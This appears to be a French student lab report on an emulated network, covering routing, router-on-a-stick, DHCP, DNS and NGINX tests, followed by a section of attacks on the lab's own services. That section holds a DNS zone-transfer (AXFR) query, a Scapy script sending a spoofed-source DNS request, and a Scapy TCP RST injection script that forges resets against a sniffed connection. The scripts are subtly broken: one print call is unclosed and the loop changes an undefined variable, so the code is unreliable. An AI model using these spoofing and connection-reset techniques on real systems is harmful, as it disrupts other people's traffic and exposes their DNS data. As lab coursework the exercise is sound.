
# I - Setup réseau initial

## Ping d'un client du LAN1 vers un client du LAN2

Commande : `ping 10.3.2.1`

```plaintext
84 bytes from 10.3.2.1 icmp_seq=1 ttl=62 time=52.200 ms
84 bytes from 10.3.2.1 icmp_seq=2 ttl=62 time=40.180 ms
84 bytes from 10.3.2.1 icmp_seq=3 ttl=62 time=37.360 ms
84 bytes from 10.3.2.1 icmp_seq=4 ttl=62 time=36.120 ms
84 bytes from 10.3.2.1 icmp_seq=5 ttl=62 time=42.960 ms
```

## Wireshark = ping_partie1.pcap
##Afficher les adresses MAC des routeurs

### R1
Commande : `show arp`

```plaintext
Protocol  Address          Age (min)  Hardware Addr   Type   Interface
Internet  10.3.12.1               -   c401.05c3.0001  ARPA   FastEthernet0/1
Internet  10.3.12.2              17   c402.05e1.0001  ARPA   FastEthernet0/1
Internet  10.3.1.1                8   0050.7966.6800  ARPA   FastEthernet1/0
Internet  192.168.122.1          11   5254.0023.04c2  ARPA   FastEthernet0/0
Internet  192.168.122.190         -   c401.05c3.0000  ARPA   FastEthernet0/0
Internet  10.3.1.254              -   c401.05c3.0010  ARPA   FastEthernet1/0
```

### R2
Commande : `show arp`

```plaintext
Protocol  Address          Age (min)  Hardware Addr   Type   Interface
Internet  10.3.12.1              17   c401.05c3.0001  ARPA   FastEthernet0/1
Internet  10.3.12.2               -   c402.05e1.0001  ARPA   FastEthernet0/1
Internet  10.3.2.1                8   0050.7966.6802  ARPA   FastEthernet1/0
Internet  10.3.2.254              -   c402.05e1.0010  ARPA   FastEthernet1/0
```

## Prouvez que vous avez déjà un accès internet sur R1

Commande : `ping 1.1.1.1`

```plaintext
Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 1.1.1.1, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 88/116/184 ms
```

## Accès internet LAN1

Commande : `ping 8.8.8.8`

```plaintext
84 bytes from 8.8.8.8 icmp_seq=1 ttl=111 time=65.656 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=111 time=49.001 ms
```

## Accès internet LAN2

Commande : `ping 8.8.8.8`

```plaintext
84 bytes from 8.8.8.8 icmp_seq=1 ttl=110 time=87.788 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=110 time=54.010 ms
84 bytes from 8.8.8.8 icmp_seq=3 ttl=110 time=56.427 ms
```


# II - Router-on-a-stick

## Tests de ping

### PC1

Commande : `show ip`

```plaintext
NAME        : PC1[1]
IP/MASK     : 10.3.1.1/24
GATEWAY     : 10.3.1.254
DNS         :
MAC         : 00:50:79:66:68:00
LPORT       : 20018
RHOST:PORT  : 127.0.0.1:20019
MTU         : 1500
```

Commande : ` PC1> ping 10.3.2.1`

```plaintext
84 bytes from 10.3.2.1 icmp_seq=1 ttl=63 time=34.889 ms
84 bytes from 10.3.2.1 icmp_seq=2 ttl=63 time=23.320 ms
84 bytes from 10.3.2.1 icmp_seq=3 ttl=63 time=21.801 ms
84 bytes from 10.3.2.1 icmp_seq=4 ttl=63 time=22.393 ms
84 bytes from 10.3.2.1 icmp_seq=5 ttl=63 time=21.761 ms
```

### R1

Commande : `R1#ping 8.8.8.8`

```plaintext
Type escape sequence to abort.
Sending 5, 100-byte ICMP Echos to 8.8.8.8, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 96/137/188 ms



### PC2

Commande : `ping 8.8.8.8`

```plaintext
84 bytes from 8.8.8.8 icmp_seq=1 ttl=126 time=38.008 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=126 time=40.151 ms
84 bytes from 8.8.8.8 icmp_seq=3 ttl=126 time=36.562 ms
```

### PC3

Commande : `ping 8.8.8.8`

```plaintext
84 bytes from 8.8.8.8 icmp_seq=1 ttl=126 time=42.084 ms
84 bytes from 8.8.8.8 icmp_seq=2 ttl=126 time=42.280 ms
84 bytes from 8.8.8.8 icmp_seq=3 ttl=126 time=47.633 ms
84 bytes from 8.8.8.8 icmp_seq=4 ttl=126 time=41.187 ms

```


#III - Services dans le LAN
 ##Prouvez avec un VPCS (DNS + DHCP)

##PC4> ip dhcp
```plaintext
DORA IP 10.3.2.10/24 GW 10.3.2.254
```
##PC4> show ip
```plaintext
NAME        : PC4[1]
IP/MASK     : 10.3.2.10/24
GATEWAY     : 10.3.2.254
DNS         : 10.3.3.1  1.1.1.1
DHCP SERVER : 10.3.2.253
DHCP LEASE  : 41342, 41345/20672/36176
MAC         : 00:50:79:66:68:03
LPORT       : 20026
RHOST:PORT  : 127.0.0.1:20027
MTU         : 1500
```
```plaintext
PC4> ping efrei.fr
efrei.fr resolved to 51.255.68.208

84 bytes from 51.255.68.208 icmp_seq=1 ttl=52 time=40.828 ms
84 bytes from 51.255.68.208 icmp_seq=2 ttl=52 time=41.031 ms
84 bytes from 51.255.68.208 icmp_seq=3 ttl=52 time=39.607 ms
84 bytes from 51.255.68.208 icmp_seq=4 ttl=52 time=37.359 ms
```
```plaintext
PC4> ping dns.tp3.b2
dns.tp3.b2 resolved to 10.3.3.1

84 bytes from 10.3.3.1 icmp_seq=1 ttl=63 time=19.730 ms
84 bytes from 10.3.3.1 icmp_seq=2 ttl=63 time=16.407 ms
84 bytes from 10.3.3.1 icmp_seq=3 ttl=63 time=15.260 ms
```
##  client (NGINX)
Commande : `debian@debian:/etc/network$ curl http://web.tp3.b2`

```plaintext
<h1>Bienvenue sur web.tp3.b2</h1>
```

Commande : `debian@debian:/etc/network$ curl http://supersite.tp3.b2`

```plaintext
<h1>Bienvenue sur supersite.tp3.b2</h1>
```

##IV - Attaques sur les services en place
 ##Requêter l'enregistrement AXFR
```plaintext
dig axfr tp3.b2 -p53 @10.3.3.10

; <<>> DiG 9.16.23-RH <<>> axfr tp3.b2 -p53 @10.3.3.10
;; global options: +cmd
tp3.b2.                 86400   IN      SOA     dns.tp3.b2. admin.tp3.b2. 201900
tp3.b2.                 86400   IN      NS      dns.tp3.b2.
dns.tp3.b2.             86400   IN      A       10.3.3.10
supersite.tp3.b2.       86400   IN      A       10.3.3.12
web.tp3.b2.             86400   IN      A       10.3.3.12
tp3.b2.                 86400   IN      SOA     dns.tp3.b2. admin.tp3.b2. 201900
;; Query time: 43 msec
;; SERVER: 10.3.3.10#53(10.3.3.10)
;; WHEN: Sat Jan 18 17:59:45 UTC 2025
;; XFR size: 6 records (messages 1, bytes 221)

```
##flood
```plaintext
from scapy.all import *
reponse = sr1(IP(dst="10.3.3.1", src="10.3.1.1")/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="tp3.b2", qtype="AXFR")),verbose=0)
print(reponse[DNS].summary()
```
## wireshark =  flood.pcap
##attaque TCP RST
```plaintext
win=512
tcp_rst_count = 10
your_iface = "enp0s3"

t = sniff(iface=your_iface, count=1, lfilter=lambda x: x.haslayer(TCP) )
t = t[0]

tcpdata = {
    'src': t[IP].src,
    'dst': t[IP].dst,
    'sport': t[TCP].sport,
    'dport': t[TCP].dport,
    'seq': t[TCP].seq,
    'ack': t[TCP].ack
}

max_seq = tcpdata['ack'] + tcp_rst_count * win
seqs = range(tcpdata['ack'], max_seq, int(win / 2))
requete = IP(src=tcpdata['dst'], dst=tcpdata['src']) / TCP(sport=tcpdata['dport'], dport=tcpdata['sport'], flags="R", window=win, seq=seqs[0])

for seq in seqs:
    p.seq = seq
    send(requete, verbose=0, iface=your_iface)
    print('TCP RESET REUSSI !!')
```
## wireshark =  tcp_rst.pcap
